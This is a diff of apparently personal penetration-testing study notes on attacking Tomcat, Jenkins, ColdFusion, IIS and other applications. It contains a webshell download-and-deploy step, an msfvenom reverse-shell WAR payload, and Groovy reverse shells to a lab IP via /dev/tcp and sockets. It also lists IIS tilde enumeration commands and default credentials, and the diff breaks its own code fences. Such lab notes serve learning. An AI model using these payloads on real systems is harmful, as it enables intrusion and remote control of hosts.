@@ -131,17 +131,17 @@
 		- tennc webshell
 			- https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
 			- Find 'war file to deploy' in the application manager and upload the payload war file
-		 ```
+		 ``
 		  wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
 		  zip -r backup.war cmd.jsp 
 		  ```
 		  - Navigate to `/{name of war file}/{name of JSP file}`
   - [GitHub - SecurityRiskAdvisors/cmd.jsp: A super small jsp webshell with file upload capabilities.](https://github.com/SecurityRiskAdvisors/cmd.jsp)
 	- msvenom
-	   ```
+	   ``
 		msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=9000 -f war > backup.war
 		nc -lvnp 9000
-		```
+		``
 		- metasplot
 			- `exploit/multi/http/tomcat_mgr_upload`
 	- CVE-2020-1938 : Ghostcat
@@ -159,7 +159,7 @@
 	- Run groovy scripts `http://jenkins.inlanefreight.local:8000/script`
 	- Example payloads
 		- Linux run command
-			 ```groovy
+			 ``groovy
 			  def cmd = 'id'
 			  def sout = new StringBuffer(), serr = new StringBuffer()
 			  def proc = cmd.execute()
@@ -169,23 +169,23 @@
 			  ```
 
 		- Reverse shell Linux host
-		  ```groovy
+		  ``groovy
 		   r = Runtime.getRuntime()
 		   p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 		   p.waitFor()
-		   ```
+		   ``
 		- Windows run command
-			```groovy
+			groovy
 			def cmd = "cmd.exe /c dir".execute();
 			println("${cmd.text}");
-			```
+			`
 		- windows reverse shell
-			```groovy
+			`groovy
 			String host="localhost";
 			int port=8044;
 			String cmd="cmd.exe";
 			Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
-			```
+			`
 
 
 ##### Splunk
@@ -296,10 +296,68 @@
 	- admin portal `/CFIDE/administrator`
 	- file extensions `.cfm`
 
-|**Method**|**Description**|
-|---|---|
-|`Port Scanning`|ColdFusion typically uses port 80 for HTTP and port 443 for HTTPS by default. So, scanning for these ports may indicate the presence of a ColdFusion server. Nmap might be able to identify ColdFusion during a services scan specifically.|
-|`File Extensions`|ColdFusion pages typically use ".cfm" or ".cfc" file extensions. If you find pages with these file extensions, it could be an indicator that the application is using ColdFusion.|
-|`HTTP Headers`|Check the HTTP response headers of the web application. ColdFusion typically sets specific headers, such as "Server: ColdFusion" or "X-Powered-By: ColdFusion", that can help identify the technology being used.|
-|`Error Messages`|If the application uses ColdFusion and there are errors, the error messages may contain references to ColdFusion-specific tags or functions.|
-|`Default Files`|ColdFusion creates several default files during installation, such as "admin.cfm" or "CFIDE/administrator/index.cfm". Finding these files on the web server may indicate that the web application runs on ColdFusion.|
+| **Method**        | **Description**                                                                                                                                                                                                                             |     |
+| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --- |
+| `Port Scanning`   | ColdFusion typically uses port 80 for HTTP and port 443 for HTTPS by default. So, scanning for these ports may indicate the presence of a ColdFusion server. Nmap might be able to identify ColdFusion during a services scan specifically. |     |
+| `File Extensions` | ColdFusion pages typically use ".cfm" or ".cfc" file extensions. If you find pages with these file extensions, it could be an indicator that the application is using ColdFusion.                                                           |     |
+| `HTTP Headers`    | Check the HTTP response headers of the web application. ColdFusion typically sets specific headers, such as "Server: ColdFusion" or "X-Powered-By: ColdFusion", that can help identify the technology being used.                           |     |
+| `Error Messages`  | If the application uses ColdFusion and there are errors, the error messages may contain references to ColdFusion-specific tags or functions.                                                                                                |     |
+| `Default Files`   | ColdFusion creates several default files during installation, such as "admin.cfm" or "CFIDE/administrator/index.cfm". Finding these files on the web server may indicate that the web application runs on ColdFusion.                       |     |
+| 
+
+
+- **IIS Tilda ~**
+	- Use 8.3 format to enumerate directories on IIS servers that support ~
+	- Tilde enum involves sending HTTP requests with different combinations to find a valid short file name
+		- http://example.com/~a
+		- http://example.com/~b
+		- http://example.com/~c
+	- When an endpoint gives a status 200 further refine the pattern
+		- http://example.com/~se
+		- http://example.com/~sf
+		- http://example.com/~sg
+	- then 
+		- http://example.com/~sec
+		- http://example.com/~sed
+		- http://example.com/~see
+	- repeat recursively
+		- http://example.com/secret~1/somefi~1.txt
+	- Enumeration
+		- normal nmap scan
+		- Use - IIS-ShortName-Scanner (https://github.com/irsdl/IIS-ShortName-Scanner)
+			- `java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/`
+		- Create a custom word list to bruteforce the full name
+			- `egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt` create a list of words based on `transf`
+		- Use the custom wordlist to run gobuster
+			- `gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp` in this instance the shortname file was an ASP file
+
+- **LDAP**
+	- OpenLDAP and MS AD
+	- Manages resources on a network. Computers, users, auth, access control lists, etc
+
+- **Web Mass Assignment**
+	- modify the model attributes of an application through the parameters sent to the server
+	- Ruby on rails
+	- Set allow list on variables to accept user input
+
+- **Attacking Apps Connected to Services**
+	- apps tend to use connection strings when using external services
+	- https://github.com/longld/peda
+	- GDB debugger
+	- DLL inspection
+	- https://github.com/0xd4d/dnSpy
+
+- **Other**
+
+| Application      | Abuse Info |
+|------------------|------------|
+| **Axis2** | This can be abused similar to Tomcat. We will often actually see it sitting on top of a Tomcat installation. If we cannot get RCE via Tomcat, it is worth checking for weak/default admin credentials on Axis2. We can then upload a webshell in the form of an AAR file (Axis2 service file). There is also a Metasploit module that can assist with this. |
+| **Websphere** | Websphere has suffered from many different vulnerabilities over the years. Furthermore, if we can log in to the administrative console with default credentials such as `system:manager` we can deploy a WAR file (similar to Tomcat) and gain RCE via a web shell or reverse shell. |
+| **Elasticsearch** | Elasticsearch has had its fair share of vulnerabilities as well. Though old, we have seen this before on forgotten Elasticsearch installs during an assessment for a large enterprise (and identified within 100s of pages of EyeWitness report output). Though not realistic, the Hack The Box machine *Haystack* features Elasticsearch. |
+| **Zabbix** | Zabbix is an open-source system and network monitoring solution that has had quite a few vulnerabilities discovered such as SQL injection, authentication bypass, stored XSS, LDAP password disclosure, and remote code execution. Zabbix also has built-in functionality that can be abused to gain remote code execution. The HTB box *Zipper* showcases how to use the Zabbix API to gain RCE. |
+| **Nagios** | Nagios is another system and network monitoring product. Nagios has had a wide variety of issues over the years, including remote code execution, root privilege escalation, SQL injection, code injection, and stored XSS. If you come across a Nagios instance, it is worth checking for the default credentials `nagiosadmin:PASSW0RD` and fingerprinting the version. |
+| **WebLogic** | WebLogic is a Java EE application server. At the time of writing, it has 190 reported CVEs. There are many unauthenticated RCE exploits from 2007 up to 2021, many of which are Java Deserialization vulnerabilities. |
+| **Wikis / Intranets** | We may come across internal Wikis (such as MediaWiki), custom intranet pages, SharePoint, etc. These are worth assessing for known vulnerabilities but also searching if there is a document repository. We have run into many intranet pages (both custom and SharePoint) that had a search functionality which led to discovering valid credentials. |
+| **DotNetNuke (DNN)** | DotNetNuke (DNN) is an open-source CMS written in C# that uses the .NET framework. It has had a few severe issues over time, such as authentication bypass, directory traversal, stored XSS, file upload bypass, and arbitrary file download. |
+| **vCenter** | vCenter is often present in large organizations to manage multiple instances of ESXi. It is worth checking for weak credentials and vulnerabilities such as this Apache Struts 2 RCE that scanners like Nessus do not pick up. This unauthenticated OVA file upload vulnerability was disclosed in early 2021, and a PoC for CVE‑2021‑22005 was released during the development of this module. vCenter comes as both a Windows and a Linux appliance. If we get a shell on the Windows appliance, privilege escalation is relatively simple using JuicyPotato or similar. We have also seen vCenter already running as SYSTEM and even running as a domain admin. It can be a great foothold in the environment or be a single source of compromise. |
+
